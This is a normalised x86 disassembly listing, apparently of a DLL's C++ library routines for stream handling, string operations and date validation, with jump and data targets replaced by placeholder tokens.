mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10009171
push 0x1c
mov eax sub_1004ad10
call sub_10023e66
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_1000ee8f
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000621a
pop ecx
lea ecx [ ebp - 0x18 ]
mov esi eax
call sub_10007b41
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
movzx edx [ ecx + 0x30 ]
mov ecx [ ecx + 0x28 ]
push edx
add eax edi
push eax
push ecx
mov [ ebp - 0x28 ] bl
push [ ebp - 0x28 ]
mov ebx [ esi ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call [ ebx + 0x4 ]
xor ebx ebx
cmp [ ebp - 0x28 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_10007c4c
mov eax edi
call sub_10023f0b
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_10007e2d
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_10009200
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000925c
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0xb ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10009388
mov eax [ ebp + 0x8 ]
leave
retn 0xc
sub_100092a6
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_1002059f
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
retn
call sub_1002059f
sub_100092ce
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_1002059f
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
add [ esi + 0x4 ] 0x8
mov eax esi
retn
call sub_1002059f
sub_100092f9
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004a7da
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
lea eax [ esp + 0xc ]
push eax
call sub_10022104
pop ecx
lea eax [ esp + 0xc ]
push eax
call sub_10022398
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
mov esi eax
call sub_10009504
mov eax [ ebp + 0x8 ]
pop ecx
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ esp + 0x1c ]
call sub_10001d1f
and [ esp + 0x68 ] 0x0
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x38 ]
call sub_10001d6b
push eax
mov [ esp + 0x6c ] 0x1
call sub_1000ad1c
sub_10009388
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10002579
push [ esp + 0x10 ]
mov ecx esi
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10002033
mov eax esi
pop esi
retn 0x10
sub_100093b2
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ecx + 0x14 ]
push ebx
push esi
push edi
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov ecx [ ecx + 0x14 ]
mov eax [ ebp + 0xc ]
cmp eax ecx
jb r-xdata
or eax 0xffffffff
sub eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
cmp edx eax
jb r-xdata
pop ebp
retn 0xc
mov eax ecx
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov [ ebp + 0xc ] eax
lea esi [ ecx + 0x4 ]
cmp eax 0x8
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x8
jb r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push edi
call sub_10006bd6
add esp 0xc
test eax eax
je r-xdata
lea edi [ eax + edx * 2 ]
mov eax [ ebp + 0x8 ]
movzx ebx [ eax ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x8
jb r-xdata
dec edi
dec edi
jmp r-xdata
cmp edi eax
je r-xdata
mov eax edi
sub eax esi
sar eax 0x1
jmp r-xdata
mov esi [ esi ]
cmp [ edi ] bx
jne r-xdata
pop edi
pop esi
pop ebx
sub_10009443
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
push edi
mov edi ecx
mov esi edi
mov ebx eax
call sub_1000a9d1
test al al
jne r-xdata
mov eax [ ebx ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x4 ]
mov [ esp + 0x14 ] eax
mov eax [ edi ]
mov [ esp + 0x18 ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x24 ]
lea ebx [ esp + 0x1c ]
call sub_1000a7fc
push [ eax + 0x4 ]
push [ eax ]
call sub_1000a91d
pop ecx
pop ecx
mov ecx eax
mov eax [ ebp + 0x8 ]
call sub_1000a963
mov eax [ ebp + 0x8 ]
mov esi ebx
call sub_1000a9d1
test al al
jne r-xdata
mov edx [ ebx ]
mov eax [ edi ]
mov ecx [ edi + 0x4 ]
mov ebx [ ebx + 0x4 ]
sub eax edx
sbb ecx ebx
push ecx
push eax
push 0x0
xor ecx ecx
xor eax eax
call sub_1000a718
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
add esp 0xc
mov [ ecx + 0x4 ] edx
mov eax ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10009504
push ebp
mov ebp esp
movzx eax [ esi + 0xc ]
sub esp 0x14
xor edx edx
inc edx
push ecx
mov ecx esp
mov [ ecx ] dx
movzx edx ax
inc edx
cmp edx 0x2
jge r-xdata
cmp ax 0x1f
ja r-xdata
call sub_1000a309
mov [ ecx ] ax
mov ax [ esi + 0x10 ]
inc ax
xor edx edx
inc edx
push ecx
movzx eax ax
mov ecx esp
mov [ ecx ] dx
movzx edx ax
inc edx
cmp edx 0x2
jge r-xdata
cmp ax 0xc
ja r-xdata
call sub_1000a292
mov [ ecx ] ax
mov eax 0x76c
add ax [ esi + 0x14 ]
push ecx
movzx eax ax
mov edx 0x578
mov ecx esp
mov [ ecx ] dx
movzx edx ax
inc edx
cmp edx 0x579
jge r-xdata
mov edx 0x2710
cmp ax dx
ja r-xdata
call sub_1000a00a
mov [ ecx ] ax
lea eax [ ebp - 0x8 ]
push eax
call sub_1000a601
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
push 0x0
push 0x0
push [ esi ]
call sub_1000a718
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
add esp 0xc
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
call sub_10009d6a
mov eax [ ebp + 0x8 ]
leave
retn
sub_100095c8
cmp eax [ esp + 0x4 ]
je r-xdata
retn 0x4
push esi
lea esi [ eax + 0x4 ]
add esi 0x8
lea eax [ esi - 0x4 ]
cmp eax [ esp + 0x8 ]
jne r-xdata
call sub_1000ad5c
mov ecx [ esi ]
test ecx ecx
je r-xdata
pop esi
sub_100095ed
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push [ ebp + 0x8 ]
mov ebx ecx
call sub_10009af9
pop ecx
mov eax ebx
pop ebx
leave
retn
sub_10009607
push 0x20
mov eax sub_1004975c
call sub_10023e33
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_100020c6
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0x10 ]
mov ecx eax
call sub_10006e82
mov ecx [ ebp + 0x8 ]
push eax
call sub_100020c6
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002597
mov eax [ ebp + 0x8 ]
call sub_10023f0b
retn
sub_10009652
push 0x20
mov eax sub_1004975c
call sub_10023e33
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_100020c6
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov ecx eax
call sub_10009c98
mov ecx [ ebp + 0x8 ]
push eax
call sub_100020c6
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002597
mov eax [ ebp + 0x8 ]
call sub_10023f0b
retn
sub_10009699
push 0x10
mov eax sub_1004ace3
call sub_10023e66
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
call sub_10020428
mov esi eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x18 ]
cmp eax ebx
pop ecx
jle r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_1000ee8f
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp eax esi
jle r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
sub eax esi
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
mov eax [ ecx ]
push esi
push [ ebp + 0xc ]
call [ eax + 0x20 ]
cmp eax esi
je r-xdata
test ebx ebx
jle r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test ebx ebx
jle r-xdata
mov [ ebp - 0x14 ] 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007c92
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x1c ]
push eax
call sub_10007c4c
mov eax edi
call sub_10023f0b
retn
push 0x0
push [ ebp - 0x14 ]
call sub_10007e2d
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
and [ eax + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007c92
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec ebx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec ebx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
jmp r-xdata
sub_100097bf
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_100097f2
push 0x20
mov eax sub_1004acbe
call sub_10023e66
mov edi [ ebp + 0x8 ]
mov eax r--data
xor esi esi
push eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] esi
call sub_100200e0
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x18 ]
cmp eax esi
pop ecx
jle r-xdata
mov [ ebp - 0x18 ] esi
cmp eax ebx
jle r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10007802
pop ecx
lea ecx [ ebp - 0x20 ]
mov esi eax
mov [ ebp - 0x4 ] 0x1
call sub_10007b41
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp sub_10009977
sub eax ebx
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push eax
call sub_1000ee8f
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
and [ eax + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
jmp sub_10009977
test ebx ebx
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007c92
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
mov eax [ ebp - 0x1c ]
mov al [ eax ]
mov [ ebp - 0x24 ] al
push [ ebp - 0x24 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + edi + 0x28 ]
movzx eax ax
push eax
call sub_10007c92
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007c92
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec ebx
inc [ ebp - 0x1c ]
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
sub_10009949
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10009977
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x2c ]
push eax
call sub_10007c4c
mov eax edi
call sub_10023f0b
retn
push 0x0
push [ ebp - 0x14 ]
call sub_10007e2d
sub_100099a3
push 0x14
mov eax sub_1004ac91
call sub_10023e66
mov edi [ ebp + 0x8 ]
push 0x30
pop esi
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_1000ee8f
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov [ eax + 0x18 ] ebx
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x18 ]
cmp ecx 0x1
jg r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_10007c4c
mov eax edi
call sub_10023f0b
retn
push ebx
push [ ebp - 0x18 ]
call sub_10007e2d
dec ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
push esi
call sub_10007c92
movzx eax ax
mov esi 0xffff
mov ecx esi
cmp cx ax
jne r-xdata
cmp [ ebp - 0x18 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ eax + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ ebp - 0x18 ] ebx
jne r-xdata
mov [ ebp - 0x18 ] 0x4
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x14 ] ebx
jle r-xdata
cmp [ ebp - 0x14 ] ebx
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007c92
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007c92
movzx eax ax
mov ecx esi
cmp cx ax
jne r-xdata
dec [ ebp - 0x14 ]
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
dec [ ebp - 0x14 ]
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
sub_10009a90
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_10007d13
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_10009af9
push ebp
mov ebp esp
sub esp 0x24
and [ ebp - 0x8 ] 0x0
push esi
mov esi eax
cmp [ esi + 0x18 ] 0x8
push edi
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
lea eax [ eax + ecx * 2 ]
push esi
push eax
lea ecx [ ebp - 0xc ]
call sub_10007b8c
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_10007b6c
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x8 ]
push 0x0
mov ecx ebx
mov [ ebp - 0x1c ] eax
mov [ ebx + 0x18 ] 0x7
call sub_10002579
push [ ebp + 0x8 ]
lea esi [ ebp - 0x18 ]
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0xc
mov edi esp
lea esi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_10009b89
pop edi
mov eax ebx
pop esi
leave
retn
sub_10009b89
push 0x4
mov eax sub_10049739
call sub_10023e66
and [ ebp - 0x4 ] 0x0
call sub_10023f0b
retn 0x20
lea ecx [ ebp + 0xc ]
call sub_10006cbe
push [ ebp + 0x14 ]
movzx esi [ eax ]
call sub_10007802
mov edx [ eax ]
pop ecx
push esi
mov ecx eax
call [ edx + 0x20 ]
mov ecx [ ebp + 0x8 ]
movzx eax ax
push eax
push 0x1
call sub_10005c07
lea ecx [ ebp + 0xc ]
call sub_10006af5
jmp r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006b30
test al al
jne r-xdata
sub_10009bf9
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10001c8c
test al al
je r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_1001afff
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_10006e82
jmp r-xdata
mov eax esi
pop ebx
mov edi [ esi + 0x14 ]
push 0x0
add edi ebx
push edi
mov ecx esi
call sub_10001fc4
test al al
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
push ebx
push [ ebp + 0x8 ]
sub eax ecx
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_1000255d
add esp 0x10
push edi
mov ecx esi
call sub_10002579
sub_10009cb5
push ecx
push esi
mov esi ebx
call sub_1000a9d1
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx [ ebx + 0x4 ]
push 0xfffffffe
pop edx
cmp eax edx
jne r-xdata
mov eax [ esp + 0xc ]
mov esi [ eax ]
test esi esi
je r-xdata
mov esi [ esp + 0xc ]
mov esi [ esi ]
cmp esi edx
je r-xdata
cmp ecx 0x7fffffff
je r-xdata
cmp esi 0xffffffff
je r-xdata
mov [ edi ] edx
push ecx
push eax
call sub_1000a905
pop ecx
pop ecx
test al al
je r-xdata
cmp esi 0xfffffffe
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
test esi esi
je r-xdata
xor eax eax
add esi [ ebx ]
adc eax [ ebx + 0x4 ]
mov [ edi ] esi
jmp r-xdata
mov eax ebx
call sub_1000a9ae
test al al
je r-xdata
cmp [ ebx + 0x4 ] 0x80000000
jne r-xdata
mov [ edi ] 0xfffffffe
jmp r-xdata
mov [ edi + 0x4 ] eax
jmp r-xdata
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
cmp esi 0xffffffff
jne r-xdata
mov [ edi + 0x4 ] 0x7fffffff
mov eax edi
pop esi
pop ecx
retn 0x4
test esi esi
jne r-xdata
or [ edi ] esi
jmp r-xdata
and [ edi ] esi
mov [ edi + 0x4 ] 0x80000000
jmp r-xdata
sub_10009d6a
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] 0x1
mov ebx [ eax ]
push edi
mov edi ecx
test ebx ebx
je r-xdata
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ebx
push eax
lea edi [ ebp - 0x14 ]
lea ebx [ ebp - 0xc ]
call sub_10009cb5
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfffffffe
je r-xdata
mov esi edi
call sub_1000a9d1
test al al
jne r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ edi ]
mov edi [ edi + 0x4 ]
push 0x14
push 0x1dd76000
push 0x0
push ebx
call sub_10027200
mov ecx eax
mov eax [ ebp + 0x8 ]
add ecx esi
adc edx edi
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov esi eax
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x4
sub_10009df6
push 0x4
mov eax sub_10048edd
call sub_10023e33
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_10009fa8
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000aa17
mov eax esi
call sub_10023f0b
retn
sub_10009e50
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10009ff2
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_10009ed1
push 0x4
mov eax sub_1004a281
call sub_10023e33
mov esi ecx
push 0x40
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_10009f57
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_10023f0b
retn
sub_10009fa8
push 0x4
mov eax sub_10048ad1
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_10009ff2
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000acbe
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_10023f0b
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000a00a
push 0xc4
mov eax sub_1004971b
call sub_10023e33
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x38 ]
call sub_1000a5bc
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ ebp - 0x54 ]
call sub_100023ce
mov [ ebp - 0x38 ] r--data
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x4 ] esi
push eax
lea esi [ ebp - 0xd0 ]
call sub_10009e50
pop ecx
lea ecx [ ebp - 0x94 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x2
call sub_10009df6
lea eax [ ebp - 0x94 ]
mov [ esp ] r--data
push eax
call sub_10023a01
int3
sub_1000a081
push 0x4
mov eax sub_10048eaf
call sub_10023e33
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000a233
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000aa17
mov eax esi
call sub_10023f0b
retn
sub_1000a0db
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1000a27a
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000a15c
push 0x4
mov eax sub_1004a281
call sub_10023e33
mov esi ecx
push 0x40
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000a1e2
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_10023f0b
retn
sub_1000a233
push 0x4
mov eax sub_10048ad1
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1000a27a
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000acbe
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_10023f0b
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000a292
push 0xc4
mov eax sub_100496e2
call sub_10023e33
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x38 ]
call sub_1000a5bc
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ ebp - 0x54 ]
call sub_100023ce
mov [ ebp - 0x38 ] r--data
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x4 ] esi
push eax
lea esi [ ebp - 0xd0 ]
